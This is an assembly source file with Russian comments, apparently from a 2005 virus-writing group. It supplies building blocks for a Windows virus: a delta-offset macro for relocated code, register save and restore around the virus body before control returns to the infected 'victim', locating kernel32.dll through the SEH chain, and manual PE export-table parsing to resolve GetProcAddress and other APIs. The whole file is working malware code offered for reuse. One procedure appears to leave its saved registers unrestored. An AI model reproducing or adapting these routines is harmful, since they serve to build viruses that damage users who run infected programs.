;===============================================================================;
;Макросы и процедуры для получения адресов API-функций в вирусе
;Автор: Bill Prisoner / TPOC 
;Дата последнего обновления: 6.10.2005
;===============================================================================;

;===============================================================================;
;Макрос startproc
;Вызывается при начале выполнения инструкций вируса или процедуры
;Вход: ничего
;Выход:ничего
;===============================================================================;
startproc macro
	push esi
	push edi
	push ebx
	push ebp
	pushfd
endm
;===============================================================================;

;===============================================================================;
;Макрос endproc
;Вызывается перед передачей управления жертве, т.е. после выполнения вирусных инструкций
;Работает в связке с startproc
;Вход: ничего
;Выход: ничего
;===============================================================================;
endproc macro
	popfd
	pop ebp
	pop ebx
	pop edi
	pop esi
endm
;===============================================================================;

;===============================================================================;
;Макрос GetDelta
;Получение дельта-смещения
;Вход: нет
;Выход:ebp - дельта-смещение
;===============================================================================;
GetDelta macro
call delta 
delta:
	pop ebp
	sub ebp,offset delta
endm
;===============================================================================;


;===============================================================================;
;Макрос api
;Вызов функции с учетом дельта смещения в процедуре, т.к. в процедуре 
;дельта смещение мы храним в регистре EBX
;Вход: x - адрес переменной с адресом функции
;Выход:результат возврата функции
;===============================================================================;
apiproc macro x
	call [ebx+x]
endm
;===============================================================================;


;===============================================================================;
;Макрос api
;Вызов функции с учетом дельта смещения
;Вход: x - адрес переменной с адресом функции
;Выход:результат возврата функции
;===============================================================================;
api macro x
	call [ebp+x]
endm
;===============================================================================;

;===============================================================================;
;Процедура GetKernelSEH
;Поиск адрес внутри kernel32.dll
;Вход: ничего
;Выход:В eax - адрес внутри kernel32.dll
;===============================================================================;
GetKernelSEH proc
	assume fs:flat;для масма обязательно. по умолчанию assume fs:err
	mov eax,dword ptr fs:[0];в eax - указатель на структуру ERR
NextElem:
	cmp dword ptr [eax],-1;последний элемент
	je Yes
	mov eax,dword ptr [eax]
	jmp NextElem
Yes:;если пришли к последнему элементу
	mov eax,[eax+4]
	ret
GetKernelSEH endp
;===============================================================================;


;===============================================================================;
;Процедура GetGetProcAddress
;Поиск адреса внутри kernel32.dll
;Вход: 
;	KernelBase - база kernel32.dll
;	Delta - дельта-смещение
;Выход:
;	В eax - адрес функции GetProcAddress
;===============================================================================;
GetGetProcAddress proc KernelBase:DWORD,Delta:DWORD
	startproc
	jmp GPA
GPAStr:
	db "GetProcAddressA"
GPA:	
	mov ecx,Delta	

	mov esi,KernelBase
	mov ebx,esi
	assume esi:ptr IMAGE_DOS_HEADER
	add esi,[esi].e_lfanew;в esi - заголовок PE

	assume esi:ptr IMAGE_NT_HEADERS
	lea esi,[esi].OptionalHeader;в esi - адрес опционального заголовка

	assume esi:ptr IMAGE_OPTIONAL_HEADER
	lea esi,[esi].DataDirectory;в esi - адрес DataDirectory
	mov esi,dword ptr [esi]
	add esi,ebx;в esi - структура IMAGE_EXPORT_DIRECTORY
	push esi
	assume esi:ptr IMAGE_EXPORT_DIRECTORY
	mov esi,[esi].AddressOfNames
	add esi,ebx;в esi - массив имен функций
	xor edx,edx;в edx - храним индекс

	mov eax,esi
	mov esi,dword ptr [esi]
NextName:;поиск следующего имени функции
	add esi,ebx
	push ecx
	mov ecx,Delta
	lea edi,[ecx+GPAStr]
	pop ecx
	mov ecx,14;количество байт в "GetProcAddress"
	cld
	repe cmpsb
	.IF ecx==0;нашли имя
		jmp GetAddr
	.ENDIF
	inc edx
	add eax,4
	mov esi,dword ptr [eax]
	jmp NextName
GetAddr:;если нашли "GetProcAddress"
	pop esi
	mov edi,esi
	mov esi,[esi].AddressOfNameOrdinals
	add esi,ebx;в esi - массив слов с индесками
	mov dx,word ptr [esi][edx*2]
	assume edi:ptr IMAGE_EXPORT_DIRECTORY
	sub edx,[edi].nBase;вычитаем начальный ординал
	inc edx;т.к. начальный ординал начинается с 1
	mov esi,[edi].AddressOfFunctions
	add esi,ebx;в esi - массив адресов функций
	mov eax,dword ptr [esi][edx*4]
	add eax,ebx;в eax - адрес функции GetProcAddress
	ret
GetGetProcAddress endp	
;===============================================================================;


;===============================================================================;
;Процедура GetBase							
;Описание:
;Поиск базы исполняемого файла, если есть адрес где-то внутри него
;Вход: Address адрес внутри файла в памяти
;Выход:В eax - база PE-файла
;===============================================================================;
GetBase proc Address:DWORD
	startproc
	mov eax,FALSE
	mov esi,Address
	and esi,0FFFF0000H;гранулярность выделения памяти
	mov ecx,6;счетчик страниц
NextPage:;проверка очередной страницы
	push esi
	push esi
	call OldValidPE
	pop esi
	.IF eax==1
		mov eax,esi
		endproc
		ret
	.ENDIF
	sub esi,10000H
	loop NextPage
	endproc
	ret
GetBase endp
;===============================================================================;


;===============================================================================;
;Процедура ValidPE
;Описание:
;Проверка правильности PE-файла
;Вход: Address - Адрес тестируемого файла в памяти
;Выход: если файл правильный, то eax=1, иначе eax=0
;===============================================================================;
ValidPE proc Address:DWORD
	startproc

	call get_new_delta
get_new_delta:
	pop ebx
	sub ebx, offset get_new_delta

	mov eax,FALSE
	mov esi,Address
	.IF WORD ptr [esi]=="ZM"
		assume esi:ptr IMAGE_DOS_HEADER;указание компилятору, что в esi указатель на IMAGE_DOS_HEADER
		add esi,[esi].e_lfanew;переход к PE заголовку
;Проверяем можно ли обратиться к этому заголовку
		push 2
		push esi
		apiproc _IsBadReadPtr;Опасность ниже не катит, так что я решил все таки предусмотреть эту опасность.
		.IF eax!=0
			endproc
			xor eax,eax
			ret
		.ENDIF		
		.IF WORD PTR [esi]=="EP";Опасное место! Т.к. может быть совпадение сначала с MZ, а по адресу e_lfanew может оказаться некорректное значение. Т.о. мы провалимся. Но учитывая, что это ситуация маловероятна и то, что мы устанавливаем обработчик исключений мы будем игнорировать эту опасность.
			mov eax,TRUE
		.ENDIF
	.ENDIF
	endproc
	ret
ValidPE endp
;===============================================================================;


;===============================================================================;
;Процедура OldValidPE
;Описание:
;	Проверка правильности PE-файла. Вызывается в тех местах в которых нет возможности получить адрес функции IsBadReadPtr
;Вход: Address - Адрес тестируемого файла в памяти
;Выход: если файл правильный, то eax=1, иначе eax=0
;===============================================================================;
OldValidPE proc Address:DWORD
	startproc

	call get_new_delta
get_new_delta:
	pop ebx
	sub ebx, offset get_new_delta

	mov eax,FALSE
	mov esi,Address
	.IF WORD ptr [esi]=="ZM"
		assume esi:ptr IMAGE_DOS_HEADER;указание компилятору, что в esi указатель на IMAGE_DOS_HEADER
		add esi,[esi].e_lfanew;переход к PE заголовку
		.IF WORD PTR [esi]=="EP";Опасное место! Т.к. может быть совпадение сначала с MZ, а по адресу e_lfanew может оказаться некорректное значение. Т.о. мы провалимся. Но учитывая, что это ситуация маловероятна и то, что мы устанавливаем обработчик исключений мы будем игнорировать эту опасность.
			mov eax,TRUE
		.ENDIF
	.ENDIF
	endproc
	ret
OldValidPE endp
;===============================================================================;


;===============================================================================;
;Макрос GetKernelBase
;Описание:
;Возвращает базу kernel32.dll
;Вход: ничего
;Выход:В eax - база kernel32.dll
;===============================================================================;
GetKernelBase macro
	call GetKernelSEH
	push eax
	call GetBase
endm
;===============================================================================;


;===============================================================================;
;Процедура GetAPIs
;Получение адресов всех требуемых API-функций
;Вход: 
;	AddressNames - указатель на массив ASCIIZ строк имен функций
;	Addressess - смещение массива двойных слов которые заполняет функция
;	Base - база DLL где находяться требуемые функции
;	AddressGetProcAddress - адрес функции GetProcAddress
;	Number - количество функций
;Выход:заполняются соответствующие поля
;===============================================================================;
GetAPIs proc Number:DWORD,AddressNames:DWORD,Addressess:DWORD,Base:DWORD,Delta:DWORD
LOCAL AddressGetProcAddress:DWORD
	startproc
	mov ebx,Delta
	jmp GetAPIFunctionsStart
GetAPIFunctionsdata:
	db "GetProcAddress",0
GetAPIFunctionsStart:
	GetKernelBase
	push ebx
	push eax
	call GetGetProcAddress
	mov AddressGetProcAddress,eax

	mov ebx,Addressess
	mov esi,Base
	mov edi,AddressNames
	mov eax,AddressGetProcAddress
	mov ecx,Number
NextFunc:
	push eax
	push esi
	push edi
	push ebx
	push ecx

	push edi;имя функции
	push esi;база kernel32
	call eax;вызов GetProcAddress
	
	pop ecx
	pop ebx
	pop edi
	pop esi

	mov dword ptr [ebx],eax;помещаем адрес функции в переменную
	pop eax
	add ebx,4;следующая переменная
	push ecx;сохраняем счетчик
	mov ecx,30;для цепочечной команды
	push eax
	mov al,0;ищем 0
	repne scasb
	pop eax
	pop ecx
	loop NextFunc
	endproc
	ret
GetAPIs endp
;===============================================================================;